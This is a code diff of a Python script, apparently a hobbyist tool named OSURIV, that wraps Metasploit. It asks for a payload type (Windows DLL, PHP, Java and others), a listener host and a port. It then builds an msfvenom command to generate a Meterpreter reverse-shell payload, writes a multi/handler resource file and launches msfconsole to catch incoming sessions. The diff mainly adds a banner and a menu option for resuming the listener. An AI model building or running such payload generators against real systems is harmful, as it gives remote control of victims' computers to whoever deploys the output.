@@ -1,4 +1,3 @@
-from ftplib import FTP
 import os
 import platform
 S10 = '\033[95m'
@@ -9,15 +8,47 @@ S14 = '\033[91m'
 S15 = '\033[0m'
 S16 = '\033[33m'
 S17 = '\033[92m'
+def draw():
+    print()
+    print()
+    print("""    )  (         (   (       """)    
+    print(""" ( /(  )\ )      )\ ))\ )   """)     
+    print(""" )\())(()/(   ( (()/(()/')((   ( """)  
+    print("""((_)\  /(_))  )\ /(_))(_))\  )\  """)
+    print("""  ((_)(_)) _ ((_|_))(_))((_)')((_) """)
+    print(""" / _ \/ __| | | | _ \_ _\ \ / /  """)
+    print("""| (_) \__ \ |_| |   /| | \ V /   """)
+    print(""" \___/|___/\___/|_|_\___| \_/    """)
+    print()
+    print()
+    print(""" .d88888b.   .d8888b.  888     888 8888888b.  8888888 888     888 """)
+    print("""d88P" "Y88b d88P  Y88b 888     888 888   Y88b   888   888     888 """)
+    print("""888     888 Y88b.      888     888 888    888   888   888     888 """)
+    print("""888     888  "Y888b.   888     888 888   d88P   888   Y88b   d88P """)
+    print("""888     888     "Y88b. 888     888 8888888P"    888    Y88b d88P  """)
+    print("""888     888       "888 888     888 888 T88b     888     Y88o88P   """)
+    print("""Y88b. .d88P Y88b  d88P Y88b. .d88P 888  T88b    888      Y888P    """)
+    print(""" "Y88888P"   "Y8888P"   "Y88888P"  888   T88b 8888888     Y8P     """)
+    print()
+    print(S17+'OSURIV V2.0 made by: Out-Shit')
+    print()
+    print()
+def Menu2():
+    msfconsole = ('msfconsole -r pluginrc')
+    os.system(msfconsole)
+    exit()
 def clear(numlines=100):
   if os.name == "posix":
     print('\n' * numlines)
     os.system('clear')
+    draw()
   elif os.name in ("nt", "dos", "ce"):
     print('\n' * numlines)
     os.system('CLS')
+    draw()
   else:
     print('\n' * numlines)
+    draw()
 clear()
 print(S10+'choose Payload:')
 print(S11+'')
@@ -27,6 +58,7 @@ print('3-Php(.php)')
 print('4-Java(.js)')
 print('5-Win x64(.dll)')
 print('6-Win x86(.dll)')
+print('7-Continue project')
 print('\x1bc')
 print('\x1bc')
 try:
@@ -60,7 +92,9 @@ if va == ('6'):
     payload = ('windows/x64/meterpreter/')
     option = (' -ax64 -f dll')
     payext = ('.dll')
-if va == ('') or va == ('7') or va == (' ') or va == ('0'):   
+if va == ('7'):
+    Menu2()
+if va == ('') or va == ('8') or va == (' ') or va == ('0'):   
     print(S17+'You have to choose an option.')
     exit()
 clear()
@@ -118,7 +152,6 @@ def Msfinstaller():
     else:
         print('@')
         exit()
-
 def Menu1():
     clear()
     print(S16+'enter the host')
@@ -136,10 +169,10 @@ def Menu1():
     print('\x1bc')
     cmd3 = input('OSURIV~ $ ')
     clear()
-    msfvenom = ('msfvenom -p '+ payload+methode+option+' LHOST=' + cmd1 + ' LPORT=' + cmd2 +' -o '+ cmd3 + payext)
+    msfvenom = ('msfvenom -p '+ payload+methode+option+' LHOST=' + cmd1 + ' LPORT=' + cmd2 +' -o '+cmd3+payext)
     os.system(msfvenom)
     plugin = ("use multi/handler\nset payload "+payload+methode+"\nset lhost "+ cmd1 +"\nset lport "+ cmd2 +"\nrun -z\nrun -z\nrun -z\nrun -z\nrun -z")
-    f = open("pluginrc", "w")
+    f = open('pluginrc', "w")
     f.write(plugin)
     f.close()
     print('\x1bc')
@@ -156,13 +189,6 @@ def Menu1():
         Main2()
     Main2()
     exit()
-
-
-def Menu2():
-    msfconsole = ('msfconsole -r pluginrc')
-    os.system(msfconsole)
-    exit()
-
 def error():
     clear()
     try:
@@ -210,5 +236,3 @@ def Main2():
         v = input(S17+'Press')
         Main2()
 Main()
-Main2()
-error()
